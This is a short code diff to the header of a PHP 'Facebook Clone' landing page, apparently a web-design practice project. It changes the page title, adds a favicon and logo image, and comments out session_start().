@@ -1,15 +1,16 @@
 <?php
-session_start();
+// session_start();
  ?>
 <!DOCTYPE html>
 <html>
 <head>
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<title>Facebook Landing Page</title>
+	<title>Facebook - log in or sing up</title>
 	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
 	<link rel="stylesheet" href="assets/css/main.css">
 	<link rel="stylesheet" href="https://cdn.jsdelivr.net/fontawesome/4.7.0/css/font-awesome.min.css">
+	<link rel="shortcut icon" href="assets/img/favicon.ico" />
 
 </head>
 <body>
@@ -17,10 +18,10 @@ session_start();
 		<div class="col-md-12 col-sm-12 col-lg-12 _header">
 			<header id="header">
 				<div>
-					<div class="pull-left">
+					<div class="logo">
 						<h1>
 							<a href="#" title="Facebook Clone">
-								<!-- <span class="logo"><img height="100" src="assets/img/facebook-logo.png" alt="facebook logo"><span> -->
+								<span class=""><img height="70" src="assets/img/logo.png" title="Facebook logo" alt="facebook logo"><span>
 							</a>
 						</h1>
 						
